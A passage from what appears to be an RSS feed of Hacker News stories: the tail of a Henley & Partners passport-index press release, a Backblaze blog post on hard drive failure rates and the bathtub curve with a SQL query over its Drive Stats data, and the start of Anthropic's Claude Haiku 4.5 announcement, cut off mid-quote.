‘visa integrity fee’ for most non-immigrant visa applications, while the cost of the Electronic System for Travel Authorization (ESTA) nearly doubled on 30 September 2025, from USD 21 to USD 40.</p><p><strong>China’s Ascent: A Decade of Gains</strong></p><p>In sharp contrast, China has been among the biggest climbers on the Henley Passport Index over the past decade, leaping from 94<sup>th</sup> place in 2015 to 64<sup>th</sup> in 2025, with its visa-free access score increasing by 37 destinations during that time.</p><p>On the Henley Openness Index, China has also risen dramatically, granting visa-free access to an additional 30 countries in the past year alone. It now sits in 65<sup>th</sup> position, providing entry to 76 nations — 30 more than the US.</p><p>Recent developments, including granting visa free access to Russia, underscore Beijing’s ongoing strategy of increased openness. China’s moves — alongside new agreements with the Gulf states, South America, and several European countries — are cementing its role as a global mobility powerhouse, bolstering the Asia-Pacific region’s dominance in travel freedom.</p><p><a href="https://www.henleyglobal.com/publications/usa-wealth-report-2025/navigating-uschina-trade-tightrope">Dr. Tim Klatte</a>, Partner at Grant Thornton China, highlights the geopolitical implications. “Trump’s return to power has bought fresh trade conflicts that weaken America’s mobility, while China’s strategic openness boosts its global influence. These diverging paths will reshape economic and travel dynamics worldwide.”</p><p><strong>Americans Lead Global Rush for Second Citizenships</strong></p><p>The decline in US passport power is fueling an unprecedented surge in demand for alternative <a href="https://www.henleyglobal.com/residence-investment">residence</a> and <a href="https://www.henleyglobal.com/citizenship-investment">citizenship</a> options. Henley &amp; Partners data shows that Americans have become by far the largest group of applicants for <a href="https://www.henleyglobal.com/countries">investment migration programs</a> in 2025.</p><p>By the end of Q3, applications from US nationals were already 67% higher than the total for 2024, which itself recorded a 60% year-on-year increase. Group Head of Private Clients at Henley &amp; Partners, Dominic Volek, says the firm now has more American clients than the next four nationalities — Turkish, Indian, Chinese, and British — combined. “Faced with unprecedented volatility, investors and wealthy American families are adopting a strategy of geopolitical arbitrage to acquire additional residence and citizenship options. They are hedging against jurisdictional risk and leveraging differences across countries to optimize personal, financial, and lifestyle outcomes.”</p><p><a href="https://www.henleyglobal.com/publications/usa-wealth-report-2025/dual-citizenship-new-american-dream">Prof. Peter J. Spiro</a> of Temple University Law School in Philadelphia says while US citizenship remains a valuable status, it’s no longer good enough as a standalone. “In coming years, more Americans will be acquiring additional citizenships in whatever way they can. Multiple citizenship is being normalized in American society. While it may be a bit of an exaggeration, as one social media poster recently put it, “dual citizenship is the new American dream”.</p><p>-<strong>Ends-</strong></p><p><strong>Notes to Editors</strong></p><p><strong>About the 2025 Henley Passport Index</strong></p><p>With cutting-edge expert commentary and historical data spanning over 20 years, the <a href="https://www.henleyglobal.com/passport-index">Henley Passport Index</a> is the original ranking of all the world’s passports according to the number of destinations their holders can access without a prior visa. Originally created by <a href="https://chriskalin.com/" target="_blank">Dr. Christian H. Kaelin</a>, the ranking is based on exclusive and official Timatic data from the <a href="https://www.iata.org/" target="_blank">International Air Transport Association</a> (IATA), which maintains the world’s largest and most accurate database of travel information, and it is enhanced by extensive, ongoing research by the <a href="https://www.henleyglobal.com/">Henley &amp; Partners</a> Research Department.</p><p>Along with the <a href="https://www.nationalityindex.com/" target="blank">Kälin – Kochenov Quality of Nationality Index</a>, it is considered a major tool for global citizens and the standard reference for government policy in this field.</p><p><strong>About Henley &amp; Partners</strong></p><p>Henley &amp; Partners is the global leader in residence and citizenship planning. Each year, hundreds of wealthy individuals and their advisors rely on our expertise and experience in this area. The firm’s highly qualified professionals work together as one team in over 70 offices worldwide.</p><p>The concept of residence and citizenship planning was created by Henley &amp; Partners in the 1990s. As globalization has expanded, residence and citizenship have become topics of significant interest among the increasing number of internationally mobile entrepreneurs and investors whom we proudly serve every day.</p><p>Henley &amp; Partners also runs the world’s leading government advisory practice for wealth migration, which has raised more than USD 15 billion in foreign direct investment. Trusted by governments, the firm has been involved in strategic consulting and in the design, set-up, and operation of the world’s most successful residence and citizenship programs.</p><p><a href="https://www.henleyglobal.com/">https://www.henleyglobal.com</a></p><p><strong>Media Contact</strong></p><p>For further information, please contact:</p><p><strong>Sarah Nicklin</strong><br>Group Head of Public Relations &amp; Communications<br><a href="mailto:sarah.nicklin@henleyglobal.com">sarah.nicklin@henleyglobal.com</a><br>+27 72 464 8965</p>
                    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Are hard drives getting better? (144 pts)]]></title>
            <link>https://www.backblaze.com/blog/are-hard-drives-getting-better-lets-revisit-the-bathtub-curve/</link>
            <guid>45595724</guid>
            <pubDate>Wed, 15 Oct 2025 17:18:13 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.backblaze.com/blog/are-hard-drives-getting-better-lets-revisit-the-bathtub-curve/">https://www.backblaze.com/blog/are-hard-drives-getting-better-lets-revisit-the-bathtub-curve/</a>, See on <a href="https://news.ycombinator.com/item?id=45595724">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content">
          <main id="main">

<div>

		<article id="post-112325">

			<!-- .entry-header -->

			<section>
				
<figure><img fetchpriority="high" decoding="async" width="1440" height="820" src="https://www.backblaze.com/blog/wp-content/uploads/2025/10/BackupArchive-0002-Blog-Header-1440x820-1.png" alt="A decorative image showing stylized hard drives. " srcset="https://backblazeprod.wpenginepowered.com/wp-content/uploads/2025/10/BackupArchive-0002-Blog-Header-1440x820-1.png 1440w, https://backblazeprod.wpenginepowered.com/wp-content/uploads/2025/10/BackupArchive-0002-Blog-Header-1440x820-1-300x171.png 300w, https://backblazeprod.wpenginepowered.com/wp-content/uploads/2025/10/BackupArchive-0002-Blog-Header-1440x820-1-1024x583.png 1024w, https://backblazeprod.wpenginepowered.com/wp-content/uploads/2025/10/BackupArchive-0002-Blog-Header-1440x820-1-768x437.png 768w" sizes="(max-width: 1440px) 100vw, 1440px"></figure>







<p>If you’ve hung around Backblaze for a while (and especially if you’re a Drive Stats fan), you may have heard us talking about the bathtub curve. In <a href="https://www.backblaze.com/blog/drive-failure-over-time-the-bathtub-curve-is-leaking/" target="_blank" rel="noreferrer noopener">Drive Failure Over Time: The Bathtub Curve Is Leaking,</a> we challenged one of reliability engineering’s oldest ideas—the notion that drive failures trace a predictable U-shaped curve over time.&nbsp;</p>



<p>But, the data didn’t agree. Our fleet showed dips, spikes, and plateaus that refused to behave. Now, after 13 years of continuous data, the picture is clearer—and stranger.&nbsp;</p>



<p>The bathtub curve isn’t just leaking, and the shape of reliability might look more like an ankle-high wall at the entrance to a walk-in shower. The neat story of early failures, calm middle age, and gentle decline no longer fits the world our drives inhabit. Drives are getting better—or, more precisely, the Drive Stats dataset says that our drives are performing better in data center environments.&nbsp;</p>



<p>So, let’s talk about what our current “bathtub curve” looks like, and how it compares to earlier generations of the analysis.&nbsp;</p>



<p><strong>The TL;DR: Hard drives are getting better, and lasting longer.</strong></p>



<h2>The intro: Let’s talk bathtub curve</h2>



<p>If you’ve spent any time around hardware reliability, you’ve seen it: a smooth U-shaped line called the bathtub curve. It promises order in the chaos of failure—a story where devices begin life with a burst of defects, settle into steady performance, and finally wear out in predictable decline. And, this is what it looks like:</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;68f03a667d54c&quot;}" data-wp-interactive="core/image"><img decoding="async" width="936" height="662" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://www.backblaze.com/blog/wp-content/uploads/2025/10/Bathtub_1_Curve-basics.png" alt="A chart showing a stylized version of the bathtub curve which takes the shape of a U created by early failures, a lower constant failure rate, then a spike again as hardware wears out over time. " srcset="https://backblazeprod.wpenginepowered.com/wp-content/uploads/2025/10/Bathtub_1_Curve-basics.png 936w, https://backblazeprod.wpenginepowered.com/wp-content/uploads/2025/10/Bathtub_1_Curve-basics-300x212.png 300w, https://backblazeprod.wpenginepowered.com/wp-content/uploads/2025/10/Bathtub_1_Curve-basics-768x543.png 768w" sizes="(max-width: 936px) 100vw, 936px"><figcaption>The classic bathtub curve. </figcaption></figure></div>






<p>For decades, it’s been engineering shorthand for how things die. But as our dataset has grown—more than a decade of drive telemetry and millions of drive-days—the data is clear: Our real drive population is more complicated.&nbsp;</p>



<h2>What the bathtub curve looked like then</h2>



<p>The first time we ran this analysis was in 2013, and when we updated the article in 2021, we shared this chart:</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;68f03a667d967&quot;}" data-wp-interactive="core/image"><img decoding="async" width="936" height="630" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://www.backblaze.com/blog/wp-content/uploads/2025/10/Bathtub_2_Legacy-comparison.png" alt="A chart that shows two different series of bar graph data, from 2013 and from 2021. " srcset="https://backblazeprod.wpenginepowered.com/wp-content/uploads/2025/10/Bathtub_2_Legacy-comparison.png 936w, https://backblazeprod.wpenginepowered.com/wp-content/uploads/2025/10/Bathtub_2_Legacy-comparison-300x202.png 300w, https://backblazeprod.wpenginepowered.com/wp-content/uploads/2025/10/Bathtub_2_Legacy-comparison-768x517.png 768w" sizes="(max-width: 936px) 100vw, 936px"></figure></div>






<p>It shows the annualized failure rate (AFR) of the full drive pool over time (in years) at two different look-back points—2013 and 2021. At that time, you could already see that the bathtub curve was starting to, as the venerable Andy Klein put it, “leak.” The 2013 data looks the closest to a true bathtub curve, while the 2021 data shows fewer early failures and a lower failure rate for more years. We also see the average longevity of drives goes up by about two years before spiking into the failure zone.</p>



<h3>Numbers can both define and obscure reality</h3>



<p>Now, there are some very interesting factors that come into play when comparing hard drive reliability over time. For example, our usual caveats about how we use drives vs. how consumers use drives, how our workloads have changed over time, etc. More importantly, though, because we’re comparing averages, it’s easy to lose track of the context around our dataset—how many hard drives are we talking about in 2013 vs. 2021?&nbsp;</p>



<p><a href="https://www.backblaze.com/blog/10-stories-from-10-years-of-drive-stats-data/" target="_blank" rel="noreferrer noopener">When we did this analysis in 2013</a>, Backblaze had been open for six years, but we’d only been publishing the Drive Stats dataset since 2013. So, arriving at presenting a look-back at the data (i.e., this is how many drives failed when they were between zero and one years old) was a bit of a math problem compared to our usual data reporting. We were talking about drives that entered the drive pool in 2007, and those were ones we hadn’t shared complete daily logs about, even if the drive was still in service in 2013 (which, as you can tell from the data, was unlikely). We achieved that by looking at failures vs. logged on hours, and when we re-created the analysis recently, we used this SQL query:&nbsp;</p>



<pre>CREATE VIEW introduction_dates AS<br>    -- Calculate the introduction date of drives that were already in service on 2013-04-10<br>    SELECT serial_number, date(date_add('hour', -1 * smart_9_raw, TIMESTAMP '2013-04-10 00:00:00')) AS introduced<br>    FROM drivestats<br>    WHERE date = DATE '2013-04-10'<br>    UNION<br>    -- Use the minimum date for drives that entered service after after 2013-04-10<br>    SELECT serial_number, MIN(date) as introduced<br>        FROM drivestats<br>        WHERE serial_number NOT IN (<br>            SELECT serial_number<br>            FROM drivestats <br>            WHERE date = DATE '2013-04-10'<br>        )<br>        GROUP BY serial_number;<p>SELECT<br>    date_diff('day', d2.introduced, d1.date) / 91 AS age_in_quarters,<br>    100 * 365 * (cast(SUM(d1.failure) AS DOUBLE) / COUNT(*)) AS afr<br>FROM drivestats AS d1<br>INNER JOIN introduction_dates AS d2<br>ON d1.serial_number = d2.serial_number<br>GROUP BY 1<br>ORDER BY 1;</p></pre>



<p>Our drive pool looked a lot different in 2013 as well. Not only was it smaller (~35,000 drives and over 100PB of data were live as of <a href="https://www.backblaze.com/blog/hard-drive-reliability-update-september-2014/" target="_blank" rel="noreferrer noopener">September 2014</a>), but it also was made up of “consumer” drives. While we <a href="https://www.backblaze.com/blog/enterprise-drive-reliability/">didn’t see much of a difference between the two</a> when we actually tested them in the environment, we did a lot of <a href="https://www.backblaze.com/blog/backblaze_drive_farming/">drive farming</a> in those days, a process that included actually “shelling” the drives and removing them from their housings—which means that our drive pool had a lot more potential to get some bumps along the way. Hard drives are pretty resilient and we were careful, but it’s worth noting.&nbsp;</p>



<p>By the time we were doing this analysis in 2021, we had a lot more data and <a href="https://www.backblaze.com/blog/backblaze-drive-stats-for-2021/">a lot more storage drives</a>—206,928 or so. Between 2013 and 2021, we had <a href="https://www.backblaze.com/blog/our-secret-data-center/" target="_blank" rel="noreferrer noopener">added capacity </a>to our Sacramento data center; expanded our data center regions with locations in <a href="https://www.backblaze.com/blog/data-center-design/" target="_blank" rel="noreferrer noopener">Phoenix</a> and <a href="https://www.backblaze.com/blog/announcing-our-first-european-data-center/" target="_blank" rel="noreferrer noopener">Amsterdam</a>, with more on the way in 2022; we <a href="https://www.backblaze.com/blog/b2-cloud-storage-provider/" target="_blank" rel="noreferrer noopener">launched Backblaze B2 Cloud Storage</a>; and, we <a href="https://www.backblaze.com/blog/backblaze-is-now-a-public-company/" target="_blank" rel="noreferrer noopener">went public</a>.&nbsp;</p>



<p>All those things are cool from a historical perspective, but the more impactful thing to pay attention to is that any time you have <em>less</em> data (read: a smaller number of total drives), each individual data point has more impact on the whole. In the bathtub curve, you naturally reduce the number of drives as they get older—every drive has a day one, but not every drive has a day 1,462 (or, in lay people’s terms: four years, one day). With fewer drives, more spikes. So, if you start off with more drives, your numbers are likely to be more steady—unless there’s a real problem, or you’re entering your true drive pool failure zone.&nbsp;</p>



<p>And, since we’ve transitioned to buying more drives, and decommissioning drives in a different way—well, that all affects what the end result is. More on our drive hygiene habits later; for now, let’s get into our current data.</p>



<h2>What the bathtub curve looks like now</h2>



<p>Without further ado, let’s look at the failure rates in our current Backblaze drive pool:</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;68f03a667de53&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="936" height="578" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://www.backblaze.com/blog/wp-content/uploads/2025/10/Bathtub_3_Drive-failure-2025.png" alt="A chart that depicts the 2025 drive failure rates for drives from ages 0-11. " srcset="https://backblazeprod.wpenginepowered.com/wp-content/uploads/2025/10/Bathtub_3_Drive-failure-2025.png 936w, https://backblazeprod.wpenginepowered.com/wp-content/uploads/2025/10/Bathtub_3_Drive-failure-2025-300x185.png 300w, https://backblazeprod.wpenginepowered.com/wp-content/uploads/2025/10/Bathtub_3_Drive-failure-2025-768x474.png 768w" sizes="auto, (max-width: 936px) 100vw, 936px"></figure></div>






<p>That’s a pretty solid deviation in both age of drive failure and the high point of AFR from the last two times we’ve run the analyses. When we ran our 2025 numbers (at the close of <a href="https://www.backblaze.com/blog/backblaze-drive-stats-for-q2-2025/">Q2 2025</a>), we reported on 317,230 drives. Take that as an approximate raw number given the normal drive exclusions in each Drive Stats report, but it gets you in the ballpark.&nbsp;</p>



<p>For consistency’s sake, here’s 2013:</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;68f03a667e150&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="936" height="578" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://www.backblaze.com/blog/wp-content/uploads/2025/10/Bathtub_4_Drive-failure-2013.png" alt="A chart that depicts the 2013 drive failure rates for drives from ages 0-5." srcset="https://backblazeprod.wpenginepowered.com/wp-content/uploads/2025/10/Bathtub_4_Drive-failure-2013.png 936w, https://backblazeprod.wpenginepowered.com/wp-content/uploads/2025/10/Bathtub_4_Drive-failure-2013-300x185.png 300w, https://backblazeprod.wpenginepowered.com/wp-content/uploads/2025/10/Bathtub_4_Drive-failure-2013-768x474.png 768w" sizes="auto, (max-width: 936px) 100vw, 936px"></figure></div>






<p>And here’s 2021:</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;68f03a667e44e&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="936" height="580" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://www.backblaze.com/blog/wp-content/uploads/2025/10/Bathtub_5_Drive-failure-2021.png" alt="A chart that depicts the 2021 drive failure rates for drives from ages 0-8." srcset="https://backblazeprod.wpenginepowered.com/wp-content/uploads/2025/10/Bathtub_5_Drive-failure-2021.png 936w, https://backblazeprod.wpenginepowered.com/wp-content/uploads/2025/10/Bathtub_5_Drive-failure-2021-300x186.png 300w, https://backblazeprod.wpenginepowered.com/wp-content/uploads/2025/10/Bathtub_5_Drive-failure-2021-768x476.png 768w" sizes="auto, (max-width: 936px) 100vw, 936px"></figure></div>






<p>What’s missing, and a bit difficult to visualize, is the scale on both the x axis (time in years) and the y axis (annualized failure rate expressed in percentage). Let’s put all three on the same chart:</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;68f03a667e743&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="936" height="580" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://www.backblaze.com/blog/wp-content/uploads/2025/10/Bathtub_6_Drive-failure-total-comparison.png" alt="A comparison of the drive failure rates from 2013, 2021, and 2025, with drives from age 0-11. " srcset="https://backblazeprod.wpenginepowered.com/wp-content/uploads/2025/10/Bathtub_6_Drive-failure-total-comparison.png 936w, https://backblazeprod.wpenginepowered.com/wp-content/uploads/2025/10/Bathtub_6_Drive-failure-total-comparison-300x186.png 300w, https://backblazeprod.wpenginepowered.com/wp-content/uploads/2025/10/Bathtub_6_Drive-failure-total-comparison-768x476.png 768w" sizes="auto, (max-width: 936px) 100vw, 936px"></figure></div>






<p>Note that both the 2013 data and the 2021 data have high failure percentage peaks at some point near the end of their drive lifetimes. In 2013, it was 13.73% at about 3 years, 3 months (and 13.30% at 3 years, 9 months). In 2021, it’s 14.24%, with that peak hitting at 7 years, 9 months.&nbsp;</p>



<p>Now, compare that with the 2025 data: Our peak is 4.25% at 10 years, 3 months (woah). Not only is that a significant improvement in drive longevity, it’s also the first time we’ve seen the peak drive failure rate at the hairy end of the drive curve. And, it’s about a third of each of the other failure peaks.&nbsp;</p>



<p>Meanwhile, we see that the drive failure rates on the front end of the curve are also incredibly low—when a drive is between zero and one years old, we barely crack 1.30% AFR. For reference, the most recent quarterly AFR is 1.36%.&nbsp;</p>



<p>Still, if we take a look at the trendlines, we can see that the 2021 and the 2025 data isn’t too far off, shape-wise. That is, we see a pretty even failure rate through the significant majority of the drives’ lives, then a fairly steep spike once we get into drive failure territory.&nbsp;</p>



<p>What does that mean? Well, drives are getting better, and lasting longer. And, given that our trendlines are about the same shape from 2021 to 2025, we should likely check back in when 2029 rolls around to see if our failure peak has pushed out even further.</p>



<h3>Hey, what about that data contextualization you did above?</h3>



<p>Good point—there are significant things that have changed about our dataset that may be affecting our numbers. We’ve already tackled the consumer vs. enterprise drive debate, and while we don’t have updated testing on that front, there are other things about buying drives at scale that may have an effect on the data.&nbsp;</p>



<p>For instance, because we buy drives in bulk, that means that a big chunk of drives enter our data pool at the same time. Given that we, over the years, have really only seen model-by-model variation, this means that if you get a lemon of a drive and you’ve added a lot of them, you may have a chunk of drives failing all at once.&nbsp;</p>



<p>Also, we have a <a href="https://www.backblaze.com/blog/how-backblaze-scales-our-storage-cloud/" target="_blank" rel="noreferrer noopener">different process for decommissioning drives</a> these days. There are lots of things that go into that strategy, but you can simplify it all to risk management and our ability to grow our storage footprint over time. From a practical perspective, that means sometimes there are drives that are still performing well that we decide to take out of service anyway—and that means they get taken out of the fleet without ever having failed. Since our analyses above are based on annualized failure rate vs. age of drive, you can see a big drop in drive population without the expected failure rate spike.&nbsp;</p>



<p>Finally, we have different standards for new drives. Some of them just have to do with the industry at large—drives are getting bigger, and <a href="https://www.backblaze.com/blog/why-cloud-native-developers-need-a-specialized-storage-layer/">storage patterns are changing</a>. But, compared with 2013, when a natural disaster forced us to innovate in unexpected ways, we’ve got more flexibility to consider our purchases, and to do so in a way that’s specific to our environment.&nbsp;</p>



<h2>Was the bathtub curve just wrong?</h2>



<p>The issue isn’t that the bathtub curve is wrong—it’s that it’s incomplete. It treats time as the only dimension of reliability, ignoring workload, manufacturing variation, firmware updates, and operational churn. And, it rests on a set of assumptions:</p>



<ul>
<li>Devices are identical and operate under the same conditions.</li>



<li>Failures happen independently, driven mostly by time.</li>



<li>The environment stays constant across a product’s life.</li>
</ul>



<p>The good news: When it comes to data centers, most of these are as true as they can be in a real-world environment. Data centers environments attempt to be as consistent as possible to be able to <a href="https://www.backblaze.com/blog/data-centers-temperature-and-power/" target="_blank" rel="noreferrer noopener">reduce power consumption</a>, and to be able to properly anticipate and plan data workloads. Basically, consistency = a happy data center.&nbsp;</p>



<p>That said, conditions can’t ever be perfect. Our numbers have always and will always reflect both good planning and the unforeseen aspects of reality. Understanding whether drives are “good” or “bad” is always a conversation between what you theorize (in this case, the bathtub curve) and what happens (the Drive Stats dataset).&nbsp;</p>



<h2>What’s next?</h2>



<p>Why does all this talk of numbers matter? Well, as we’ve expanded our drive pool over time, in some ways, we’ve increased confidence in the results we’re seeing, both on day one and day 1,462. Even if we had the exact same drives models and drive pool make up (by percentage) from 2013 that we did in 2021, having more of them would give us better results. But, now we have a greater diversity of drives <em>and </em>more of them.&nbsp;</p>



<p>That doesn’t mean we’re the be-all, end-all of drive reliability, but it does give us some more footing to slice and dice the data and bring it back to you. As always, you can find the full <a href="https://www.backblaze.com/cloud-storage/resources/hard-drive-test-data" target="_blank" rel="noreferrer noopener">Drive Stats dataset on our website</a>, which means you can repeat this experiment, or use the data in any way you can imagine. Stay tuned for our quarterly reports and more articles from the Drive Stats extended universe—and feel free to sign up for the <a href="https://hub.backblaze.com/drive-stats-newsletter-sign-up" target="_blank" rel="noreferrer noopener">Drive Stats newsletter</a> if you want to stay up-to-date.</p>

							</section><!-- .entry-content -->

			
		<!-- taxonomy -->
		
		<!-- .entry-footer -->

						<section>
		<img alt="" data-del="avatar" src="https://www.backblaze.com/blog/wp-content/uploads/2024/03/BB-flame-icon-300x300-1-150x150.jpg" height="100" width="100">		<div>
			
			<p> Meet the Backblaze Drive Stats team, and sign up for more newsletter happenings on the <a href="https://hub.backblaze.com/drive-stats-newsletter-sign-up" rel="noopener nofollow">Drive Stats newsletter.</a>

<strong>Stephanie Doyle</strong> is the Writer and Blog Operations Specialist at Backblaze. She specializes in taking complex topics and writing relatable, engaging, and user-friendly content. You can most often find her reading in public places, and can connect with her on <a href="https://www.linkedin.com/in/sdoyle24">LinkedIn</a>.

<strong>Pat Patterson</strong> is the chief technical evangelist at Backblaze. Over his three decades in the industry, Pat has built software and communities at Sun Microsystems, Salesforce, StreamSets, and Citrix. In his role at Backblaze, he creates and delivers content tailored to the needs of the hands-on technical professional, acts as the “voice of the developer” on the Product team, and actively participates in the wider technical community. Outside the office, Pat runs far, having completed ultramarathons up to the 50 mile distance. Catch up with Pat via <a href="https://bsky.app/profile/metadaddy.net" rel="noopener">Bluesky</a> or <a href="https://www.linkedin.com/in/metadaddy/" rel="noopener">LinkedIn</a>.</p><!-- .author-description -->
		</div><!-- .author-bio-content -->
	</section><!-- .author-bio -->
				

		<!-- end .related-posts -->
	</article><!-- #post-112325 -->
	




	</div><!-- end .main-content -->


			</main><!-- #main -->
		</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Claude Haiku 4.5 (484 pts)]]></title>
            <link>https://www.anthropic.com/news/claude-haiku-4-5</link>
            <guid>45595403</guid>
            <pubDate>Wed, 15 Oct 2025 16:55:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.anthropic.com/news/claude-haiku-4-5">https://www.anthropic.com/news/claude-haiku-4-5</a>, See on <a href="https://news.ycombinator.com/item?id=45595403">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div><p>Claude Haiku 4.5, our latest small model, is available today to all users.</p><p>What was recently at the frontier is now cheaper and faster. Five months ago, Claude Sonnet 4 was a state-of-the-art model. Today, Claude Haiku 4.5 gives you similar levels of coding performance but at one-third the cost and more than twice the speed.</p><div><figure><img alt="Chart comparing frontier models on SWE-bench Verified which measures performance on real-world coding tasks" loading="eager" width="1920" height="1080" decoding="async" data-nimg="1" srcset="https://www.anthropic.com/_next/image?url=https%3A%2F%2Fwww-cdn.anthropic.com%2Fimages%2F4zrzovbb%2Fwebsite%2F1a27d7a85f953c5a0577dc19b507d6e1b93444d5-1920x1080.png&amp;w=1920&amp;q=75 1x, https://www.anthropic.com/_next/image?url=https%3A%2F%2Fwww-cdn.anthropic.com%2Fimages%2F4zrzovbb%2Fwebsite%2F1a27d7a85f953c5a0577dc19b507d6e1b93444d5-1920x1080.png&amp;w=3840&amp;q=75 2x" src="https://www.anthropic.com/_next/image?url=https%3A%2F%2Fwww-cdn.anthropic.com%2Fimages%2F4zrzovbb%2Fwebsite%2F1a27d7a85f953c5a0577dc19b507d6e1b93444d5-1920x1080.png&amp;w=3840&amp;q=75"></figure></div><p>Claude Haiku 4.5 even surpasses Claude Sonnet 4 at certain tasks, like using computers. These advances make applications like <a href="http://claude.ai/redirect/website.v1.03904de1-7c6c-466f-9101-095a3008a2da/chrome">Claude for Chrome</a> faster and more useful than ever before.</p><p>Users who rely on AI for real-time, low-latency tasks like chat assistants, customer service agents, or pair programming will appreciate Haiku 4.5’s combination of high intelligence and remarkable speed. And users of Claude Code will find that Haiku 4.5 makes the coding experience—from multiple-agent projects to rapid prototyping—markedly more responsive.</p><p>Claude Sonnet 4.5, released <a href="https://www.anthropic.com/news/claude-sonnet-4-5">two weeks ago</a>, remains our frontier model and the best coding model in the world. Claude Haiku 4.5 gives users a new option for when they want near-frontier performance with much greater cost-efficiency. It also opens up new ways of using our models together. For example, Sonnet 4.5 can break down a complex problem into multi-step plans, then orchestrate a team of multiple Haiku 4.5s to complete subtasks in parallel.</p><p>Claude Haiku 4.5 is available everywhere today. If you’re a developer, simply use claude-haiku-4-5 via the Claude API. Pricing is now $1/$5 per million input and output tokens.</p><h2 id="benchmarks"><br>Benchmarks</h2><div><figure><img alt="Comparison table of frontier models across popular benchmarks" loading="lazy" width="1920" height="1625" decoding="async" data-nimg="1" srcset="https://www.anthropic.com/_next/image?url=https%3A%2F%2Fwww-cdn.anthropic.com%2Fimages%2F4zrzovbb%2Fwebsite%2F029af67124b67bdf0b50691a8921b46252c023d2-1920x1625.png&amp;w=1920&amp;q=75 1x, https://www.anthropic.com/_next/image?url=https%3A%2F%2Fwww-cdn.anthropic.com%2Fimages%2F4zrzovbb%2Fwebsite%2F029af67124b67bdf0b50691a8921b46252c023d2-1920x1625.png&amp;w=3840&amp;q=75 2x" src="https://www.anthropic.com/_next/image?url=https%3A%2F%2Fwww-cdn.anthropic.com%2Fimages%2F4zrzovbb%2Fwebsite%2F029af67124b67bdf0b50691a8921b46252c023d2-1920x1625.png&amp;w=3840&amp;q=75"><figcaption>Claude Haiku 4.5 is one of our most powerful models to date. See footnotes for methodology.</figcaption></figure></div><div><div><p><img alt=" logo" loading="lazy" width="120" height="48" decoding="async" data-nimg="1" src="https://www-cdn.anthropic.com/images/4zrzovbb/website/a638c23edfce0d313f951732a2379b89cd40d682-235x64.svg"></p><p><span>“</span></p><blockquote><p>Claude Haiku 4.5 hit a sweet spot we didn't think was possible: <strong>near-frontier coding quality with blazing speed and cost efficiency</strong>. In Augment's agentic coding evaluation, it achieves 90% of Sonnet 4.5's performance, matching much larger models. We're excited to offer it to our users.</p></blockquote></div><div><p><img alt=" logo" loading="lazy" width="120" height="48" decoding="async" data-nimg="1" src="https://www-cdn.anthropic.com/images/4zrzovbb/website/32f32b6f971c962b99a5d1420a1f1540dc92dc39-2000x800.svg"></p><p><span>“</span></p><blockquote><p><strong>Claude Haiku 4.5 is a leap forward for agentic coding</strong>, particularly for sub-agent orchestration and computer use tasks. The responsiveness makes AI-assisted development in Warp feel instantaneous.</p></blockquote></div><div><p><img alt=" logo" loading="lazy" width="120" height="48" decoding="async" data-nimg="1" src="https://www-cdn.anthropic.com/images/4zrzovbb/website/094b76abf3e64453c224e12ae388b8008b02660e-150x48.svg"></p><p><span>“</span></p><blockquote><p>Historically models have sacrificed speed and cost for quality. Claude Haiku 4.5 is blurring the lines on this trade off: <strong>it's a fast frontier model that keeps costs efficient</strong> and signals where this class of models is headed.</p></blockquote></div><div><p><img alt=" logo" loading="lazy" width="120" height="48" decoding="async" data-nimg="1" src="https://www-cdn.anthropic.com/images/4zrzovbb/website/02dced142fb26d4a3441cad79f997a1fd6c9a8b0-150x48.svg"></p><p><span>“</span></p><blockquote><p><strong>Claude Haiku 4.5 delivers intelligence without sacrificing speed</strong>, enabling us to build AI applications that utilize both deep reasoning and real-time responsiveness.</p></blockquote></div><div><p><img alt=" logo" loading="lazy" width="120" height="48" decoding="async" data-nimg="1" src="https://www-cdn.anthropic.com/images/4zrzovbb/website/9235b38d087c4aea7debc0e62fc6f37d337ff237-356x68.svg"></p><p><span>“</span></p><blockquote><p>Claude Haiku 4.5 is remarkably capable—<strong>just six months ago, this level of performance would have been state-of-the-art</strong> on our internal benchmarks. Now it runs up to 4-5 times faster than Sonnet 4.5 at a fraction of the cost, unlocking an entirely 